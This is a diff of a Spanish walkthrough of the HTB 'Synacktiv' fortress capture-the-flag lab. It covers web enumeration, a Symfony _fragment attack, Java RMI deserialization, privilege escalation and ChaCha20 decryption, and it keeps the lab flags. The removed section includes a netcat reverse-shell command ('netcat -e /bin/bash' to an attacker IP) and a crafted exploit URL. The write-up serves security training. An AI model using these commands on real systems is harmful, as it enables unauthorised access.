@@ -1,9 +1,6 @@
 
 ### Split
 
-#### SYNACKTIV{Br34K_Th3_@pp_1Nt0_Fr4gM3NtS}
-
-  
 
 Iniciamos la máquina escaneando los puertos de la máquina con `nmap` donde encontramos solo un puerto abierto que es el `80` este corre un servicio `http`
 
@@ -18,13 +15,7 @@ PORT   STATE SERVICE
 
 En la web principal podemos encontrarnos solo una página por defecto de `apache2` en debian, pero hay algo que llama la atención el titulo nos muestra un `dominio`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/1.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/1.png)
+![image](../../../Imágenes/20250521164523.png)
 
 Tal vez si apuntamos al `dominio` nos muestre algo diferente, pero para que sepa donde apuntar cuando apuntamos a el lo agregaremos al archivo `/etc/hosts`
 
@@ -36,19 +27,8 @@ Tal vez si apuntamos al `dominio` nos muestre algo diferente, pero para que sepa
 
 Al abrir la web a través del dominio `hackfail.htb` nos carga una nueva página, y mirando con `wappalyzer` las tecnologias usadas nos dice que corre un `Symfony`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/2.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/2.png)[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/3.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/3.png)
+![image](../../../Imágenes/20250521164547.png)
+![image](../../../Imágenes/20250521164558.png)
 
 Teniendo un dominio podemos fuzzear posibles subdominios usando `wfuzz`, al hacerlo encontramos un subdominio con una respuesta diferente y es `dev`
 
@@ -80,23 +60,11 @@ Para que sepa resolver el subdominio lo agregamos tambien al archivo `/etc/hosts
 
 Si lo abrimos desde el navegador nos encontramos una página casi igual a la principal, esta tambien corre `symfony` como tecnologia pero con algunos cambios
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/14.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/14.png)
+![image](../../../Imágenes/20250521164617.png)
 
 A diferencia de la primera pagina si accedemos a `/_profiler` nos encontramos con que esta usando el modo de depuracion de `symfony` en este subdominio
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/15.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/15.png)
+![image](../../../Imágenes/20250521164640.png)
 
 Ya que esta habilitado podemos usar [eos](https://github.com/synacktiv/eos) para escanear este host y dumpear informacion, en el apartado `Project sources` podemos ver rutas del codigo fuente
 
@@ -195,33 +163,15 @@ session_start();
 
 Podemos comprobarlo, si intentamos registrar al usuario `elonmusk` devuelve un error
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/16.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/16.png)
+![image](../../../Imágenes/20250521164657.png)
 
 Sin embargo al comparar la `string` en minusculas podemos cambiar algunas por mayusculas y con `ElonMUsk` si que nos deja registrar a este usuario en la web
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/17.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/17.png)
+![image](../../../Imágenes/20250521164713.png)
 
 Al iniciar sesión como `ElonMusk` suplantamos a `elonmusk` y somos administradores
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/19.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/19.png)
+![image](../../../Imágenes/20250521164731.png)
 
 Ya que tenemos acceso podemos buscar rutas de las que podamos aprovecharnos en el archivo `AdminController.php` del que podemos dumpear su codigo usando `eos`
 
@@ -422,15 +372,9 @@ SYNACKTIV{Br34K_Th3_@pp_1Nt0_Fr4gM3NtS}
 www-data@blog:~/blog/public$
 ```
 
-  
-
-  
 
 ### AcedDC
 
-#### SYNACKTIV{TrY_t0_m0n1t0r_My_g@dG3T5}
-
-  
 
 Buscando formas de escalar podemos monitorear procesos con [pspy](https://github.com/DominicBreuker/pspy) despues de unos segundos encontramos que el id `1000` ejecuta con `java 11` un compilado pasandole como argumento la ip `172.22.1.250` que es diferente a la nuestra
 
@@ -442,13 +386,7 @@ CMD: UID=1000  PID=19404  | /usr/lib/jvm/jdk-11.0.10/bin/java -jar /home/elonmus
 
 Podemos descargar el archivo de java y decompilarlo usando `jd-gui`, en el codigo vemos la clase `Main` que usa el argumento y se conecta al puerto `1099` de esa ip
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/6.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/6.png)
+![image](../../../Imágenes/20250521164759.png)
 
 Esto nos hace pensar que hay mas hosts activos, podemos subir un binario estatico de [nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) para escanear la red, encontramos los hosts `.53` y `.250` activos
 
@@ -582,13 +520,7 @@ El modo `guess` intentara descubrir metodos en el servicio mediante un diccionar
 
 Realmente el metodo `login` no tiene funciones que nos sirvan para ejecutar comandos pero podemos usar el metodo `sendData` que encontramos en el propio .jar
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/7.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/7.png)
+![image](../../../Imágenes/20250521164809.png)
 
 Podemos hacer uso de el boundname `monitoring` y la signature `sendData` para a traves de deserializacion ejecutar un `comando` que nos envie una bash con netcat
 
@@ -625,15 +557,8 @@ SYNACKTIV{TrY_t0_m0n1t0r_My_g@dG3T5}
 monitoring@watcher:/$
 ```
 
-  
-
-  
-
 ### Let's dance
 
-#### SYNACKTIV{m0r3_L1k3_Crypt0F@1l!}
-
-  
 
 Antes habiamos visto un `ftp` abierto en la `.53`, podemos conectarnos como el usuario `anonymous` y obtenemos acceso a un `backup.tar` que descargamos
 
@@ -725,33 +650,15 @@ Para analizar el archivo apk primero lo convertiremos en un jar usando `d2j-dex2
 
 Ahora con `jd-gui` podemos decompilar el jar, en la clase `MainActivity` podemos ver una lista de `decimales` que conforman una cadena cifrada para la contraseña
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/8.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/8.png)
+![image](../../../Imágenes/20250521164829.png)
 
 Para el cifrado de esta cadena utiliza `ChaCha20`, podemos ver el codigo en la clase
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/9.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/9.png)
+![image](../../../Imágenes/20250521164837.png)
 
 En el siguiente [articulo](https://www.javainterviewpoint.com/chacha20-encryption-and-decryption/) podemos ver como funciona el cifrado de `ChaCha20`, para decifrarlo necesitaremos la cadena encriptada y una cadena en texto plano, ambas podemos encontrarlas en la clase `MainActivity` y las representaremos en hex
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/13.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/13.png)
+![image](../../../Imágenes/20250521164847.png)
 
 Basandonos en el [articulo](https://www.javainterviewpoint.com/chacha20-encryption-and-decryption/) de como funciona `ChaCha20` y las funciones que encontramos el propio codigo de la clase que vemos en `jd-gui` podemos crear un pequeño script en `python` que con ello se encargue de decifrar la cadene cifrada
 
@@ -830,35 +737,16 @@ Al ejecutar el script nos muestra la `contraseña` del apk que a su vez es la `f
 SYNACKTIV{m0r3_L1k3_Crypt0F@1l!}  
 ```
 
-  
-
-  
-
 ### Spongbob's neighbour
 
-#### SYNACKTIV{Th3r3_1s_n0_pl4ce_l1ke_l0c@lh0st}
-
-  
 
 Para ver el funcionamiento instalaremos el `apk` en un movil, al abrir la app nos pedira una `contraseña` la cual sabemos que es la `flag` que conseguimos antes
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/10.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/10.png)
+![image](../../../Imágenes/20250521164911.png)
 
 Al ingresar la contraseña la aplicacion inicia a generar codigos `otp`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/11.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/11.png)
+![image](../../../Imágenes/20250521164932.png)
 
 Estos codigos podemos usarlos para la `vpn` que teniamos antes, al intentar iniciar la vpn nos pide un usuario que sera `elonmusk` y una contraseña que sera el `otp`
 
@@ -928,13 +816,7 @@ PORT     STATE SERVICE
 
 Al abrirlo en el navegador podemos encontrar algo interesante que es el nombre del equipo `core01` por lo que podemos pensar que el dominio es `core01.local`
 
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/12.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/12.png)
+![image](../../../Imágenes/20250521164946.png)
 
 Podemos escanear puertos con este dominio usando [spose](https://github.com/aancw/spose) que pasando a traves del `squid proxy` logramos encontrar el puerto `22` de ssh abierto en el equipo
 
@@ -1048,15 +930,8 @@ SYNACKTIV{Th3r3_1s_n0_pl4ce_l1ke_l0c@lh0st}
 [admin]>
 ```
 
-  
-
-  
-
 ### I want to break free
 
-#### SYNACKTIV{L3ss_is_Th3_n3w_Sh3LL}
-
-  
 
 Dentro de las funciones encontramos `changeLog` que es la que mas llama la atención ya que nos abre un archivo pero con `less` ya que entra en modo paginate
 
@@ -1128,15 +1003,8 @@ SYNACKTIV{L3ss_is_Th3_n3w_Sh3LL}
 network_admin@core01:~$
 ```
 
-  
-
-  
-
 ### Muppets love'em
 
-#### SYNACKTIV{E@t_d4t_C00kie}
-
-  
 
 Mirando los privilegios de `sudoers` este usuario puede ejecutar un binario `admin_backup` como root sin proporcionar contraseña, este tiene 2 modos
 
@@ -1311,15 +1179,8 @@ SYNACKTIV{E@t_d4t_C00kie}
 >
 ```
 
-  
-
-  
-
 ### The HTB redemption
 
-#### SYNACKTIV{S3Linux_1s_w@y_bett3r}
-
-  
 
 En el directorio `/` tambien encontramos un archivo `flag.txt` que es la ultima, sin embargo aunque ejecutamos comandos como `root` no tenemos permiso para leer
 
@@ -1383,101 +1244,3 @@ SYNACKTIV{S3Linux_1s_w@y_bett3r}
 ```
 
   
-
-  
-
-### Extra 1
-
-#### Flag 1 - Leak APP_SECRET
-
-  
-
-Despues de probar multiples cosas intentamos fuzzear `cabeceras` intentando conseguir una respuesta diferente o un `error` que nos de informacion, 3 cabeceras nos devuelven errores de auterizacion pero `Php-Auth-User` nos devuelve un `500`
-
-```
-❯ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers -u http://hackfail.htb/ -H "FUZZ: 0" --hc 200  
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://hackfail.htb/
-Total requests: 1102
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload
-=====================================================================
-
-000000256:   417        14 L     49 W       431 Ch      "Expect"
-000000305:   400        12 L     53 W       422 Ch      "Host"
-000000480:   500        957 L    6616 W     90293 Ch    "Php-Auth-User"
-000000713:   400        10 L     35 W       301 Ch      "Transfer-Encoding"
-```
-
-  
-
-Para poder ver el error en el navegador interceptamos la petición con `burpsuite` y agregamos la cabecera `Php-Auth-User` con cualquier valor, por ejemplo `0`
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/4.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/4.png)
-
-Enviamos y en la respuesta vemos el error, si vamos a la opcion `Stack Trace` se nos muestra informacion de la aplicacion entre ella el valor de `APP_SECRET`
-
-[
-
-![](https://xchg2pwn.github.io/fortresses/synacktiv/5.png)
-
-
-
-](https://xchg2pwn.github.io/fortresses/synacktiv/5.png)
-
-Ya con el `secreto` replicamos la primera parte para crear un payload que nos envie una shell con `netcat` y ganamos acceso como `www-data` donde leemos la flag
-
-```
-❯ python3 secret_fragment_exploit.py http://hackfail.htb/_fragment -i http://hackfail.htb/_fragment -m 1 -s 8c780d40a55d81caf1583f1de0bfede3 -a sha256 -f shell_exec -p cmd:'netcat -e /bin/bash 10.10.14.10 443'  
-http://hackfail.htb/_fragment?_path=cmd%3Dnetcat%2B-e%2B%252Fbin%252Fbash%2B10.10.14.10%2B443%26_controller%3Dshell_exec&_hash=l2CDqtatifq37alW0wkt67jVIJLNVa3%2BA10khlZj0L8%3D
-```
-
-  
-
-```
-❯ curl -s 'http://hackfail.htb/_fragment?_path=cmd%3Dnetcat%2B-e%2B%252Fbin%252Fbash%2B10.10.14.10%2B443%26_controller%3Dshell_exec&_hash=l2CDqtatifq37alW0wkt67jVIJLNVa3%2BA10khlZj0L8%3D'  
-```
-
-  
-
-```
-❯ sudo netcat -lvnp 443
-Listening on 0.0.0.0 443
-Connection received on 10.13.37.13
-script /dev/null -c bash
-Script started, file is /dev/null
-www-data@blog:~/blog/public$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)  
-www-data@blog:~/blog/public$ hostname -I
-172.22.1.97 
-www-data@blog:~/blog/public$ cat ../flag.txt
-SYNACKTIV{Br34K_Th3_@pp_1Nt0_Fr4gM3NtS}
-www-data@blog:~/blog/public$
-```
-
-  
-
-  
-
-### Extra 2
-
-#### Flag 5 - Read flag.txt
-
-  
-
-Para la flag 5 ocupabamos el payload `|$command` para ganar acceso, como alternativa en `less` podemos usar `:e` para leer archivos, asi que podemos leer la flag
-
-```
-:e flag.txt
-SYNACKTIV{L3ss_is_Th3_n3w_Sh3LL}  
-```
